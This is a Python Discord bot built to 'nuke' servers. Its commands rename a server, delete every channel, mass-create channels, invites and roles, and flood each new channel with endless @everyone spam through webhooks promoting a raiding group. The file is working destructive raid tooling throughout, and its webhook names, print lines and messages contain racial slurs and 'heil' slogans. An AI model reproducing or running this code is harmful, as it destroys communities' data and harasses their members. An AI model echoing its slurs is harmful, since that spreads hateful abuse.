import discord
from discord.ext import commands
import random
import requests as rq
import colorama
from colorama import Fore, Back, Style, init
init()

TOKEN = input("Token: ")
CHANNELS = ["HMG on top", "HMG runs u", "Jak is cool", "HMG the best"]
SPAM = ["""
```Nuked By His Majesty's Guard [ĦМ₲]```

__**HEIL THE GUARD**__
https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966/Untitled296_20221128195950.png
https://discord.gg/rdXHweYQ7f
||@everyone||
""", "hi @everyone https://cdn.discordapp.com/emojis/993106566964334652.gif"]
WEBHOOKS = ["NIGGERED BY THE GUARD", "HMG on top", "HMG fixes the server", "useless webhook", "HMG runs u"]
ROLE = ["Heil Jak | Long Live His Majesty's Guard [ĦМ₲]"]
SERVNICK = "ĦМ₲ OWNS YOU LMAO"
SERVAV = "https://media.discordapp.net/attachments/1092873583593787412/1092998870310588416/Untitled31_20230404222146_1.jpg"

intents = discord.Intents.all()
client = commands.Bot(command_prefix = ">", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â€ƒâ€ƒâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â€ƒâ€ƒâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â€ƒâ€ƒâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•â•â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â€ƒâ€ƒâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ•‘â–‘â•šâ•â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â€ƒâ€ƒâ–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘")
    print(f"{Fore.MAGENTA}â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â•â•â•â•â•â€ƒâ€ƒâ•šâ•â•â–‘â–‘â•šâ•â•â•â–‘â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â–‘â–‘â•šâ•â•")
    print("Niggas will get nukkad lol")

@client.command()
async def nuke(ctx):
    await ctx.send("You wanna see what the massacre is? ill let u see it")
    await ctx.guild.edit(name=SERVNICK)
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
      try:
        await channel.delete()
      except:
        print("DELETING CHANNELS: FAILED")
    for _i in range(125):
        await ctx.guild.create_text_channel(name=(random.choice(CHANNELS)))
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite Link: {link}")
    amount = 500
    for i in range(amount):
        await ctx.guild.create_text_channel(name=random.choice(CHANNELS))
    return
@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(WEBHOOKS))
    while True:
        await channel.send(random.choice(SPAM))
        await webhook.send(random.choice(SPAM),
            username=random.choice(WEBHOOKS))

@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for x in range(100):
    try:
      await ctx.guild.create_role(name=ROLE)
      print(f"{x} Roles Created!")
    except:
        pass

client.run(TOKEN)
